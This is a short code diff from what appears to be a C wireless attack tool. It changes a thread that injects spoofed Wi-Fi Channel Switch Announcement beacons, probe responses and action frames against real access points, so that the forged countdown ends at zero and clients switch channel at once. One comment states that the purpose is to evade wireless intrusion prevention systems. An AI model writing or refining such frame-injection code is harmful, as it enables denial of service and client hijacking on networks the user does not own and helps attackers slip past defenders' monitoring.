@@ -4081,8 +4081,8 @@ static void *stress_injector_thread(void *arg) {
           redir = 11;
         const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
 
-        /* [UPGRADE] Realistic Countdown Burst to evade WIPS */
-        for (int c = 3; c >= 1; c--) {
+        /* [UPGRADE] Realistic Countdown Burst to evade WIPS, ending in 0 (immediate) */
+        for (int c = 3; c >= 0; c--) {
           len = mk_csa_beacon(tmp, bss, ssid, (uint8_t)snap[i].channel,
                               (uint8_t)redir, (uint8_t)c);
 
@@ -4115,8 +4115,8 @@ static void *stress_injector_thread(void *arg) {
           redir = 11;
         const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
 
-        /* [UPGRADE] Realistic Countdown Burst */
-        for (int c = 3; c >= 1; c--) {
+        /* [UPGRADE] Realistic Countdown Burst ending in 0 */
+        for (int c = 3; c >= 0; c--) {
           /* 1. Target specific AP BSSID */
           len = mk_probe_resp_csa(tmp, bss, BCAST, ssid, (uint8_t)snap[i].channel,
                                   (uint8_t)redir, (uint8_t)c);
@@ -4162,8 +4162,8 @@ static void *stress_injector_thread(void *arg) {
         if (redir < 1)
           redir = 11;
 
-        /* [UPGRADE] Realistic Countdown Burst */
-        for (int c = 3; c >= 1; c--) {
+        /* [UPGRADE] Realistic Countdown Burst ending in 0 */
+        for (int c = 3; c >= 0; c--) {
           /* 1. Target specific AP BSSID */
           len = mk_csa_action(tmp, bss, BCAST, (uint8_t)redir, (uint8_t)c);
           if (inject_one(sock, tmp, len) > 0) {
